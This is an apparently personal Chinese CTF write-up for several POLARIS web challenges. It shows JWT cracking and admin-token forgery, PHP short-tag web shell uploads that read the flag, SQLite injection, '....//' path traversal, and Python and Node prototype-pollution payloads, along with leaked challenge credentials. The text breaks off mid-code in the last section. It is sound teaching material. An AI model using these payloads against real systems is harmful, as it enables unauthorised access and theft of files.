---
title: "POLARISCTF_web_easy"
date: "2026-04-06T00:00:00+08:00"
lastmod: "2026-04-06T00:00:00+08:00"
slug: "POLARIS-web简单"
summary: "1.only real"
tags:
  - "Web"
  - "POLARIS"
params:
  protected: false
  commentId: "POLARIS-web简单"
  legacyId: "POLARIS-web简单"
---

# 1.only real

f12看前端源码：得到<!-- xmuser/123456 -->

随后尝试伪造cookie

```
_clck=xhammg%5E2%5Eg4q%5E0%5E2145; _ga_BFDVYZJ3DE=GS2.1.s1774669028$o61$g1$t1774669037$j51$l0$h0; _ga=GA1.1.2057677002.1769704968; _clsk=ysyf6m%5E1774669037220%5E3%5E1%5Es.clarity.ms%2Fcollect; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NzQ2ODA3OTB9.JFhyCZzB3XjqrpAgHYB244mN0djl9BNjRFih1k0tkgM
```

使用JWTcrack工具进行全字母数字范围的密钥爆破

```
jwt-cracker -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NzQ2ODA3OTB9.JFhyCZzB3XjqrpAgHYB244mN0djl9BNjRFih1k0tkgM -a abcdefghijklmnopqrstuvwxyz0123456789 --max 6
Attempts: 100000 (220K/s last attempt was '1eeb')
Attempts: 200000 (287K/s last attempt was 'tkjd')
SECRET FOUND: cdef
Time taken (sec): 0.914
Total attempts: 300000
```

在jwt.io进行伪造admin，得到

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzc0NjgwNzkwfQ.9Hd2oVIJd9RENv8Pex3v_EaA-StqOzKqU0MvZYKsY40
```

稍微尝试了下，文件内容过滤php，eval，post，assert

短标签绕过：

```
Gemini said
既然 php、eval、post、assert 这些关键词都被过滤了，说明后端极大概率在对上传文件的内容进行扫描（Content-Based Filtering）。

在 CTF 中，这种过滤通常有两种绕过思路：利用 PHP 的灵活性（变形） 或者 寻找不受限制的执行方式。

1. 绕过关键字过滤的姿势
A. 短标签绕过 (Short Open Tags)
如果后端只过滤了 <?php，可以尝试短标签。

写法：<?=  等价于 <?php echo 。

Payload：<?=目录执行命令?>
```

```
<?=`ls /`;
```

发现几个文件，读取一下，

读取env：

```
KUBERNETES_SERVICE_PORT=449
KUBERNETES_PORT=1449
APACHE_CONFDIR=/etc/apache2
HOSTNAME=dep-259f09a2-d9f7-4333-9a8e-6b5eb49d5a56-5db7bdb6f7-bsn4s
PHP_INI_DIR=/usr/local/etc/php
SHLVL=0
PHP_LDFLAGS=-Wl,-O1 -pie
APACHE_RUN_DIR=/var/run/apache2
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_VERSION=7.4.33
APACHE_PID_FILE=/var/run/apache2/apache2.pid
GPG_KEYS=42670A7FE4D0441C8E4632349E4FDC074A4EF02D 5A52880781F755608BF815FC910DEB46F53EA312
PHP_ASC_URL=https://www.php.net/distributions/php-7.4.33.tar.xz.asc
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_URL=https://www.php.net/distributions/php-7.4.33.tar.xz
KUBERNETES_PORT_443_TCP_ADDR=unix:///var/run/docker.sock
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
KUBERNETES_PORT_443_TCP_PORT=1449
APACHE_LOCK_DIR=/var/lock/apache2
KUBERNETES_PORT_443_TCP_PROTO=
LANG=C
APACHE_RUN_GROUP=www-data
APACHE_RUN_USER=www-data
APACHE_LOG_DIR=/var/log/apache2
KUBERNETES_SERVICE_PORT_HTTPS=449
KUBERNETES_PORT_443_TCP=
PWD=/var/www/html/uploads
PHPIZE_DEPS=autoconf 		dpkg-dev 		file 		g++ 		gcc 		libc-dev 		make 		pkg-config 		re2c
KUBERNETES_SERVICE_HOST=unix:///var/run/docker.sock
PHP_SHA256=924846abf93bc613815c55dd3f5809377813ac62a9ec4eb3778675b82a27b927
APACHE_ENVVARS=/etc/apache2/envvars

```

看看有些什么文件

```
<?=`ls -aR /var/www/html`;
```

明显的flag.php

```
/var/www/html: . .. Dockerfile dashboard.php entrypoint.sh flag.php index.php jwt.php login.php logout.php message.php static upload.php uploads /var/www/html/static: . .. style.css /var/www/html/uploads: . .. 008eadf6a872c3501941278cf5aa9768_muma.php 07a33b7e5efaaf11e0d0e1e4c9565f89_muma.php 1a2e68522d0b615d8156643227dec52d_muma.php 1b91f0d39610235d41918826bf652187_muma.php 3d11013ef1046e3eb8efa41590658224_muma.php 4b33454ec45cba48f6c80142a10bc66c_muma.php 4c44e9bb6d1f85b7a76ab888909b5869_muma.php 5df5c9b79ec3d3672a1fa75046c6fd5f_muma.php 654e8d55ff83c739b0e3b79ad4b9ec83_muma.php 679bca3c333e28ba338204cbe6ff3d8e_muma.php 7569f45e1c8d05fc53b7385f7493d0f3_muma.php 83e0a291442d5f515412039d5441cae1_muma.php 89dd6ae86cd8452c816101e798b01595_muma.php 8a2a708b5fd54d9bb1a4954a5c2a7b78_muma.php 8e6281784bc55fe08f634c5b4a5fb673_muma.php 967bde2ad3396bbcf381f993ecbcd39f_muma.php 97839fcfad2b52f7b31297b66d4b66e3_muma.php 97a4fa50ae8d612844136f22cf30b681_muma.php 9cb3de498797caa80672cece0b715ca0_muma.jpg a568199e77e6eae57173b7fd6e7c305e_muma.php c9c6196cc62d179a9d3f64db6693c635_muma.php cc3d9bf0fb1edea561be2c0405185bdb_muma.jpg db13870987d5943dd6db545c1149aeea_muma.php df88ed17a1eb394ffd86cf90dd2c0a48_muma.php f1b2ff94bde138e8c8f92d1e770cccd5_muma.php 
```

看看entrypoint.sh文件内容

```shell
#!/bin/bash

set -e



# Handle FLAG environment variable

if [ "$FLAG" ]; then

echo $FLAG > /var/www/html/flag.php

chmod 444 /var/www/html/flag.php

export FLAG=""

fi



# 写死的配置

DB_HOST="127.0.0.1"

DB_USER="root"

DB_PASSWORD="root"

DB_NAME="joomla"

DB_TYPE="mysqli"



ADMIN_USER="Admin"

ADMIN_USERNAME="admin"

ADMIN_PASSWORD="adm1n_passw0rd_123_234rfcds"

ADMIN_EMAIL="admin@example.com"

SITE_NAME="Joomla Revenge"



# ========== 配置 MariaDB ==========

mkdir -p /var/run/mysqld

chown mysql:mysql /var/run/mysqld

chmod 755 /var/run/mysqld



cat > /etc/mysql/mariadb.conf.d/99-docker.cnf < /dev/null 2>&1; then

echo "[*] MariaDB is ready."

break

fi

sleep 1

done



for i in $(seq 1 30); do

if mysqladmin -h 127.0.0.1 -P 3306 ping > /dev/null 2>&1; then

echo "[*] MariaDB TCP is ready."

break

fi

sleep 1

done



if ! mysql -e "USE ${DB_NAME}" > /dev/null 2>&1; then

echo "[*] Creating database ${DB_NAME}..."

mysql <
```

看看message.php

```php
	<?php
if(isset($_POST['msg'])){

    libxml_use_internal_errors(true);

    $xml = $_POST['msg'];

    // 🚫 禁止 file:// 协议
    if(preg_match('/file:\/\//i', $xml)){
        die("<div class='tip'>非法协议</div>");
    }
```

再看看dashboard.php

```php+HTML
<?php
include "jwt.php";
error_reporting(0);
if(!isset($_COOKIE['token'])) die("未登录");

$data = jwt_decode($_COOKIE['token'],"cdef");
if(!$data) die("非法Cookie");

$role = $data['role'];
$name = $role=="admin"?"xmadmin":"xmuser";

function fake_twig($input){
    if(preg_match('/system|exec|passthru|shell|file|php|eval|cat|flag|\.\.|\//i', $input)){
        return "Blocked";
    }

    if(preg_match('/{{(.*?)}}/', $input, $m)){
        $exp = $m[1];
        $exp = str_replace(["'", '"'], '', $exp);

        if(preg_match('/^[0-9+\-*\/\s]+$/', $exp)){
            eval("\$res = $exp;");
            return $res;
        }else{
            return "Invalid";
        }
    }

    return htmlspecialchars($input);
}

$nick = $name;
$msg  = "欢迎来到星盟招新赛";

$nick_tip = "";
$age_tip = "";
$upload_tip = "";

if($role=="admin"){

    if(isset($_POST['nick'])){
        $nick = $_POST['nick'];
        $nick_tip = "你的昵称已经更改为：".$nick;
    }

    if(isset($_POST['age'])){
        $age = fake_twig($_POST['age']);
        $age_tip = "你的年龄已经更改为：".$age;
    }else{
        $age = "18";
    }

    if(isset($_FILES['file'])){

    $f = $_FILES['file'];
    $tmp = $f['tmp_name'];
    $name = $f['name'];

    if($f['error'] !== 0){
        $upload_tip = "上传失败";
    }else{

        $content = file_get_contents($tmp);

        // 黑名单变量
        $black_list = [
            "system",
            "exec",
            "passthru",
            "shell_exec",
            "eval",
            "assert",
            "phpinfo",
            "base64_decode",
            "flag",
            "<?php",
            "php"
        ];

        $blocked = false;

        foreach($black_list as $bad){
            if(stripos($content, $bad) !== false){
                $blocked = true;
                break;
            }
        }

        if($blocked){
            $upload_tip = "文件内容包含非法关键字，上传失败";
        }else{

            // 不校验扩展名（符合你的要求）
            $newname = md5(time().$name)."_".$name;
            $path = "uploads/".$newname;

            move_uploaded_file($tmp, $path);

            $upload_tip = "你的文件已经上传，路径为：".$path;
        }
    }
}


}else{
    $age = "18";
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>星盟后台管理</title>
<style>
body{
    background:linear-gradient(120deg,#0f2027,#203a43,#2c5364);
    color:#fff;
    font-family:Segoe UI;
}
.top{
    padding:20px;
    background:#0008;
    display:flex;
    justify-content:space-between;
}
.card{
    background:#111c;
    width:600px;
    margin:40px auto;
    padding:30px;
    border-radius:12px;
    box-shadow:0 0 20px #000;
}
input,textarea,button{
    width:100%;
    margin:8px 0;
    padding:10px;
    border:none;
    border-radius:6px;
}
button{
    background:#3fb;
    cursor:pointer;
}
.tip{color:#6cf;}
</style>
</head>

<body>

<div class="top">
<div>⭐ 星盟后台管理系统</div>
<div>当前身份：<?=$role?> | <a href="logout.php" style="color:#6cf">退出</a></div>
</div>

<div class="card">
<form method="post" enctype="multipart/form-data">

昵称:
<input name="nick" <?=$role!="admin"?"disabled":""?> value="<?=$nick?>">
<div class="tip"><?=$nick_tip?></div>

年龄:
<input name="age" <?=$role!="admin"?"disabled":""?> value="<?=$age?>">
<div class="tip"><?=$age_tip?></div>

背景图上传:
<input type="file" name="file" <?=$role!="admin"?"disabled":""?>>
<div class="tip"><?=$upload_tip?></div>

留言板:
<textarea name="msg" <?=$role!="admin"?"disabled":""?>><?=$msg?></textarea>

<button <?=$role!="admin"?"disabled":""?>>提交修改</button>

</form>
<script>
document.querySelector("input[name='file']").addEventListener("change", function(){
    const file = this.files[0];
    if(!file) return;

    const allowed = ["image/jpeg","image/png"];
    if(!allowed.includes(file.type)){
        alert("只允许上传 jpg / jpeg / png 格式图片！");
        this.value = "";
    }
});
</script>


<?php
if($role=="admin"){
    include "message.php";
}
?>

</div>

</body>
</html>
```

看看upload.php 

```php
<?php
$f = $_FILES['file'];
if(preg_match("/php|phtml/i",$f['name'])){
    die("非法类型");
}
move_uploaded_file($f['tmp_name'],"uploads/".$f['name']);
echo "上传成功";

```

确实是一堆烟雾弹，最后还是短标签语句实现flag读取，这里通配符比较容易乱跑

```http
------WebKitFormBoundaryb0jXHOCDTS1v00wO
Content-Disposition: form-data; name="file"; filename="muma.php"
Content-Type: image/jpeg

<?=`base64 /var/www/html/fl*g.p*`;
------WebKitFormBoundaryb0jXHOCDTS1v00wO
Content-Disposition: form-data; name="msg"

欢迎来到星盟招新赛
------WebKitFormBoundaryb0jXHOCDTS1v00wO--

```

```
使用问号：
code
PHP
<?=`cat /var/www/html/fl?g.???`;
注意：如果文件包含 < 等特殊符号可能会被浏览器当作 HTML 标签隐藏，建议在执行后右键查看网页源代码，或者直接用 base64 命令把内容编码输出：
code
PHP
<?=`base64 /var/www/html/fl*g.p*`;
```

# 2.only_real_revenge

依旧伪造cookie

```
_clck=xhammg%5E2%5Eg4r%5E0%5E2145; _ga_BFDVYZJ3DE=GS2.1.s1774784649$o67$g1$t1774784724$j55$l0$h0; _ga=GA1.1.2057677002.1769704968; _clsk=4ogi93%5E1774784719416%5E9%5E1%5Es.clarity.ms%2Fcollect; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NzQ3ODkyMzB9.1A4Nqsuhsi4A0bXPYpFhF9aRm9WvhutLGTGQ91gIpPw
```

```
weizao1:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzc0Nzg5MjMwfQ.lABIf4ZAnKKkqrI_cBT9PDjxY8sW0N4OmxLEZuxmaLs
```



这一次：看ls /发现文件在服务器根目录下

直接cat /f*

```
<?=`cat /f*`;
```

得到flag

```
xmctf{25d7ecd0-d2dc-42af-b243-9ac180383c21}
```

# 3.AutoPypy

附件源码

```python
import os
import sys
import subprocess
from flask import Flask, request, render_template, jsonify

app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)


@app.route('/')
def index():
    return render_template("index.html")

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return 'No file part', 400
    
    file = request.files['file']
    filename = request.form.get('filename') or file.filename
    
    save_path = os.path.join(UPLOAD_FOLDER, filename)
    
    save_dir = os.path.dirname(save_path)
    if not os.path.exists(save_dir):
        try:
            os.makedirs(save_dir)
        except OSError:
            pass

    try:
        file.save(save_path)
        return f'成功上传至: {save_path}'
    except Exception as e:
        return f'上传失败: {str(e)}', 500

@app.route('/run', methods=['POST'])
def run_code():
    data = request.get_json()
    filename = data.get('filename')

    target_file = os.path.join('/app/uploads', filename)

    launcher_path = os.path.join(BASE_DIR, 'launcher.py')

    try:
        proc = subprocess.run(
            [sys.executable, launcher_path, target_file],
            capture_output=True,
            text=True,
            timeout=5,
            cwd=BASE_DIR 
        )
        return jsonify({"output": proc.stdout + proc.stderr})
    except subprocess.TimeoutExpired:
        return jsonify({"output": "Timeout"})

if __name__ == '__main__':
    import site
    print(f"[*] Server started.")
    print(f"[*] Upload Folder: {UPLOAD_FOLDER}")
    print(f"[*] Target site-packages (Try to reach here): {site.getsitepackages()[0]}")
    app.run(host='0.0.0.0', port=5000)

```

此处run下存在：

```python
@app.route('/run', methods=['POST'])
def run_code():
    data = request.get_json()
    filename = data.get('filename')

    target_file = os.path.join('/app/uploads', filename)

    launcher_path = os.path.join(BASE_DIR, 'launcher.py')

```

os.path.join路径拼接漏洞：
一篇解读文章：https://blog.csdn.net/m0_75178803/article/details/136310298

具体的就是：

```
os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。

然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径
```

然后此处，在读取文件处直接采用/flag即可得到flag

# 4.ez_python

附件app.py

```python
from flask import Flask, request
import json

app = Flask(__name__)

def merge(src, dst):  ##
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class Config:
    def __init__(self):
        self.filename = "app.py"

class Polaris:
    def __init__(self):
        self.config = Config()

instance = Polaris()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    return "Welcome to Polaris CTF"

@app.route('/read')
def read():
    return open(instance.config.filename).read()

@app.route('/src')
def src():
    return open(__file__).read()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)

```

merge存在属性覆盖漏洞：
了解一下这个函数:

```
merge 函数通常用于将两个数据集（如 DataFrame、表或字典）基于一个或多个共享键进行关联和合并。它在数据分析（Pandas）、数据库操作（SQL JOIN）和编程语言（Python, R, Java）中非常普遍，支持内部连接、外部连接、左连接和右连接，类似于 SQL 的 JOIN 操作。
```

```
在Python的Pandas库中，merge函数是一种常用的工具，用于根据一个或多个键将两个或多个DataFrame对象合并在一起。
```

针对于merge函数：

语法：

```python
pd.merge(left, right, how='inner', on=None, left_on=None, right_on=None,left_index=False, right_index=False, sort=True,suffixes=('_x', '_y'), copy=True)
```

此处的merge只是左右合并操作

此处另一个函数：setattr()可用于修改属性

```
描述
setattr() 函数对应函数 getattr()，用于设置属性值，该属性不一定是存在的。

语法
setattr() 语法：

setattr(object, name, value)
参数
object -- 对象。
name -- 字符串，对象属性。
value -- 属性值。
返回值
无。

实例
以下实例展示了 setattr() 函数的使用方法：

对已存在的属性进行赋值：
```

针对此处存在：

```python
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            # 漏洞点 1：允许用户通过 key 访问并递归进入对象
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:  #很明显要传入的filename不是一个字典
            merge(v, getattr(dst, k))
        else:
# 漏洞点 2：允许用户通过 setattr 直接修改对象属性
            setattr(dst, k, v)

class Config:   ### 漏洞点 3：Config 类中包含一个 filename 属性，用户可以通过 merge 函数修改它的值
    def __init__(self):         
        self.filename = "app.py"

class Polaris:              
    def __init__(self):         
        self.config = Config()

instance = Polaris()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)   #将用户输入的数据合并到 instance 对象中，可能会修改 instance.config.filename 的值
```

于是构造：

```json
{
    "config":{
        "filename":"/etc/passwd"
    }
}
```

根据：

```python
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    return "Welcome to Polaris CTF"
```

/下会就接受request.data，构造的全新的config.filename值会篡改原本instance.config.filename的值，紧接着：

```python
@app.route('/read')
def read():
    return open(instance.config.filename).read()
```

会打开阅读instance.config.filename的内容

```json
{
    "config":{
        "filename":"/flag"
    }
}
```

得到flag

```
XMCTF{73459c2c-5e3b-4cd3-9da6-6a272a0848b2}
```

# 5.Broken Trust（upsolve）

先注册一个用户lily

```
得到唯一uid
Registration Successful!
Your Unique ID (UID):
ed5562760df243e4a4235e02160b35bc
(Please save this ID, it is your only way to login)
```

登录后查看前端源代码：

```josn
async function refreshProfile() {
        const uid = "ed5562760df243e4a4235e02160b35bc"; // 现在是字符串
        const msg = document.getElementById('msg');
        msg.innerText = "Syncing with API...";
        
        try {
            const response = await fetch('/api/profile', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ uid: uid }) // 发送字符串
            });
            const data = await response.json();
            if(data.username) {
                msg.innerText = "Session synced. Current user: " + data.username;
            } else {
                msg.innerText = "Sync failed: " + (data.error || "Unknown error");
            }
        } catch (e) {
            msg.innerText = "Error connecting to API.";
        }
    }
```

此处存在一个鲜明的注册登录逻辑

脑洞吗，，，这里uid查询存在SQL注入

```http
POST /api/profile HTTP/1.1
Host: 8080-761073b0-b121-4544-9330-67cfc1cee35a.challenge.ctfplus.cn
Content-Length: 34
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Origin: http://8080-761073b0-b121-4544-9330-67cfc1cee35a.challenge.ctfplus.cn
Content-Type: application/json
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://8080-761073b0-b121-4544-9330-67cfc1cee35a.challenge.ctfplus.cn/register
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"uid":"0' union select 1,2,3--+"}
```

可以得到：

```
{"role":3,"uid":1,"username":2}
```

测试不存在database function

```
{"uid":"0' union select 1,group_concat(name),3 from sqlite_master WHERE type='table'--+"}
```

```
{"role":3,"uid":1,"username":"users"}
```

```
{"uid":"0' union select 1,2,group_concat(sql) from sqlite_master WHERE type='table'--+"}
```

```
{"role":"CREATE TABLE users \n                        (uid TEXT PRIMARY KEY, \n                         username TEXT NOT NULL, \n                         role TEXT NOT NULL)","uid":1,"username":2}
```

sqlite查不到什么

```
{"uid":"admin' or 1=1--"}
```

考虑到存在users这个表，直接看admin信息，确实存在

```
{"role":"admin","uid":"127ecde13e724527bf251d8d08d034f8","username":"admin"}
```

登陆后，点击[Access Backup Server](http://8080-761073b0-b121-4544-9330-67cfc1cee35a.challenge.ctfplus.cn/api/admin?action=backup&file=config.json)

存在一个文件读取方式

/flag和../../../../../../../../均失败，其他方式也无果，

叁玖思路

```
测试发现后端对路径穿越做了替换过滤（大概率是 replace('../', '')）。
采用双写绕过技巧，使用 ....//，当后端把中间的 ../ 删掉后，剩下的字符刚好重新拼接成完整的 ../。
最终 Payload：/api/admin?action=backup&file=....//....//....//....//flag
```

等题目的源码看看是不是这样

```
XMCTF{e97d708a-f200-453b-91fa-7906979b3878}
```

# 6.ezpollute

app.js

```json
const express = require('express');
const { spawn } = require('child_process');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(__dirname));

function merge(target, source, res) {
    for (let key in source) {
        if (key === '__proto__') {
            if (res) {
                res.send('get out!');
                return;
            }
            continue;
        } 
        
        if (source[key] instanceof Object && key in target) {
            merge(target[key], source[key], res);
        } else {
            target[key] = source[key];
        }
    }
}

let config = {
    name: "CTF-Guest",
    theme: "default"
};

app.post('/api/config', (req, res) => {
    let userConfig = req.body;

    const forbidden = ['shell', 'env', 'exports', 'main', 'module', 'request', 'init', 'handle','environ','argv0','cmdline'];
    const bodyStr = JSON.stringify(userConfig).toLowerCase();
    for (let word of forbidden) {
        if (bodyStr.includes(`"${word}"`)) {
            return res.status(403).json({ error: `Forbidden keyword detected: ${word}` });
        }
    }

    try {
        merge(config, userConfig, res);
        res.json({ status: "success", msg: "Configuration updated successfully." });
    } catch (e) {
        res.status(500).json({ status: "error", message: "Internal Server Error" });
    }
});

app.get('/api/status', (req, res) => {

    const customEnv = Object.create(null);
    for (let key in process.env) {
        if (key === 'NODE_OPTIONS') {
            const value = process.env[key] || "";

            const dangerousPattern = /(?:^|\s)--(require|import|loader|openssl|icu|inspect)\b/i;

            if (!dangerousPattern.test(value)) {
                customEnv[key] = value;
            }
            continue;
        }
        customEnv[key] = process.env[key];
    }
    
    const proc = spawn('node', ['-e', 'console.log("System Check: Node.js is running.")'], {
        env: customEnv,
        shell: false 
    });
    
    let output = '';
    proc.stdout.on('data', (data) => { output += data; });
    proc.stderr.on('data', (data) => { output += data; });
    
    proc.on('close', (code) => {
        res.json({ 
            status: "checked", 
            info: output.trim() || "No output from system check."
        });
    });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Flag 位于 /flag
app.listen(3000, '0.0.0.0', () => {
    console.log('Server running on port 3000');
});

```

看看黑名单：

```
禁了__proto__
const forbidden = ['shell', 'env', 'exports', 'main', 'module', 'request', 'init', 'handle','environ','argv0','cmdline'];
const dangerousPattern = /(?:^|\s)--(require|import|loader|openssl|icu|inspect)\b/i;
```

对于过滤：

```
1.可以用constructor 和 prototype
```

后续黑名单，突破口在于：

```js
app.get('/api/status', (req, res) => {

    const customEnv = Object.create(null);
    for (let key in process.env) {      //遍历环境
        if (key === 'NODE_OPTIONS') {   //检验，即进行waf过滤，禁止用户通过 NODE_OPTIONS 注入危险参数
            const value = process.env[key] || "";//输出env中键值，如果没有就为空""，

            const dangerousPattern = /(?:^|\s)--(require|import|loader|openssl|icu|inspect)\b/i;

            if (!dangerousPattern.test(value)) {
                customEnv[key] = value;
            }
            continue;
        }
        customEnv[key] = process.env[key];
    }
```

首先存在键："NODE_OPTIONS"

然后针对这里

针对requires学习：https://juejin.cn/post/6972095839632097293#heading-6

```
正则是为了防止执行 --require /flag。绕过思路如下：
 
绕过正则：正则匹配的是行首 ^ 或空白符 s 后接 --require。传入 ""--require" /flag"，字符串以双引号开头，完美避开 ^ 和 s。
Node 机制：Node.js 底层解析 NODE_OPTIONS 时支持引号包裹，并在执行时会自动剥离外层双引号，最终依然以 --require /flag 运行。
信息泄露：/flag 内容不是合法的 JS 代码，require 加载时会报 SyntaxError 并将出错行（flag文本）打印到 stderr。/api/status 刚好收集了 stderr 并返回给前端。
```

payload：

```json
{
  "constructor": {
    "prototype": {
      "NODE_V8_COVERAGE": "",
      "NODE_OPTIONS": "\"--require\" \"/flag\""
    }
  }
}
```

随后check'

```
XMCTF{4ca97d75-04e6-404e-860d-bcb4c81969b0}
```

# 7.DXT（upsolve）

Desktop Extensions (DXT，桌面扩展) 是一种用于打包和分发本地MCP (Model Context Protocol) 服务器的标准化格式。

前端源码：

```js
// Global state
let servers = [];

(function() {
    'use strict';

    // DOM 元素引用
    const elements = {
        uploadArea: document.getElementById('uploadArea'),
        fileInput: document.getElementById('fileInput'),
        serversList: document.getElementById('serversList'),
        messageContainer: document.getElementById('messageContainer'),
        detailsModal: document.getElementById('detailsModal'),
        modalTitle: document.getElementById('modalTitle'),
        modalBody: document.getElementById('modalBody')
    };

    // --- 辅助函数 ---
    
    function escapeHtml(text) {
        if (!text) return '';
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    function showMessage(type, message) {
        const msgDiv = document.createElement('div');
        msgDiv.className = `message ${type}`;
        msgDiv.innerHTML = message;
        
        elements.messageContainer.innerHTML = '';
        elements.messageContainer.appendChild(msgDiv);
        
        setTimeout(() => {
            if (msgDiv.parentNode) msgDiv.parentNode.removeChild(msgDiv);
        }, 5000);
    }

    // --- 核心业务逻辑 ---

    async function uploadFile(file) {
        showMessage('info', `正在上传 ${escapeHtml(file.name)}...`);
        const formData = new FormData();
        formData.append('file', file);

        try {
            const response = await fetch('/api/upload', { method: 'POST', body: formData });
            const data = await response.json();
            if (response.ok) {
                showMessage('success', '✓ 文件上传成功！');
                loadServers();
            } else {
                showMessage('error', `上传失败: ${data.error || '未知错误'}`);
            }
        } catch (error) {
            showMessage('error', `网络错误: ${error.message}`);
        }
    }

    async function loadServers() {
        try {
            const response = await fetch('/api/servers');
            const data = await response.json();
            if (!response.ok) throw new Error('无法加载服务列表');
            
            servers = data.servers || [];
            renderServers();
        } catch (error) {
            elements.serversList.innerHTML = `<div class="empty-state">⚠️ 加载失败，请刷新页面</div>`;
        }
    }

    // --- 视图渲染 (已清理 HTML 拼接) ---

    function renderServers() {
        if (servers.length === 0) {
            elements.serversList.innerHTML = `<div class="empty-state">📭 暂无服务，请上传 .dxt 文件</div>`;
            return;
        }

        // 使用模板字面量生成卡片
        elements.serversList.innerHTML = servers.map(server => {
            const isRunning = server.running;
            const statusClass = isRunning ? 'running' : '';
            const statusText = isRunning ? 'Running' : 'Stopped';
            const safeId = escapeHtml(server.id);

            return `
                <div class="server-card ${statusClass}" id="server-${safeId}">
                    <div class="server-header">
                        <div class="server-title">
                            <div class="server-name">${escapeHtml(server.name)}</div>
                            <div class="server-version">v${escapeHtml(server.version)}</div>
                        </div>
                        <span class="server-status ${statusClass}">${statusText}</span>
                    </div>
                    <div class="server-meta">
                        ID: <code>${safeId.substring(0, 8)}...</code>
                    </div>
                    <div class="server-actions">
                        <button class="btn btn-sm" onclick="showDetails('${safeId}')">📋 详情</button>
                        <button class="btn btn-sm btn-success" onclick="startServer('${safeId}')">▶ 启动</button>
                        <button class="btn btn-sm btn-danger" onclick="stopServer('${safeId}')">⏹ 停止</button>
                        <button class="btn btn-sm btn-danger" onclick="deleteServer('${safeId}')">🗑 删除</button>
                    </div>
                </div>`;
        }).join('');
    }

    // --- 详情弹窗渲染 ---

    function renderDetails(server) {
        const { manifest, command, id } = server;
        elements.modalTitle.textContent = manifest.display_name || manifest.name;

        // 构造结构化内容
        const sections = [];

        // 1. 基本信息
        sections.push(`
            <div class="modal-section">
                <h3>基本设置</h3>
                <div class="info-grid">
                    <div class="info-item"><div class="info-label">名称</div><div class="info-value">${escapeHtml(manifest.display_name || manifest.name)}</div></div>
                    <div class="info-item"><div class="info-label">ID</div><div class="info-value"><code>${escapeHtml(id)}</code></div></div>
                    <div class="info-item"><div class="info-label">版本</div><div class="info-value">${escapeHtml(manifest.version)}</div></div>
                </div>
            </div>
        `);

        // 2. 命令行信息
        sections.push(`
            <div class="modal-section">
                <h3>运行命令</h3>
                <div class="command-display"><code>${escapeHtml(command || 'N/A')}</code></div>
            </div>
        `);

        // 3. 工具列表
        if (manifest.tools?.length > 0) {
            const toolsHtml = manifest.tools.map(tool => `
                <div class="tool-item">
                    <div class="tool-name">${escapeHtml(tool.name)}</div>
                    <div class="tool-desc">${escapeHtml(tool.description || '无描述')}</div>
                </div>
            `).join('');
            sections.push(`<div class="modal-section"><h3>工具列表 (${manifest.tools.length})</h3>${toolsHtml}</div>`);
        }

        elements.modalBody.innerHTML = sections.join('');
    }

    // --- 事件绑定 ---
    
    elements.uploadArea.addEventListener('click', () => elements.fileInput.click());
    
    elements.fileInput.addEventListener('change', (e) => {
        if (e.target.files[0]) {
            uploadFile(e.target.files[0]);
            elements.fileInput.value = '';
        }
    });

    // 拖拽逻辑 (保持原样，仅清理匿名函数)
    elements.uploadArea.addEventListener('drop', (e) => {
        e.preventDefault();
        const file = e.dataTransfer.files[0];
        if (file?.name.endsWith('.dxt')) {
            uploadFile(file);
        } else {
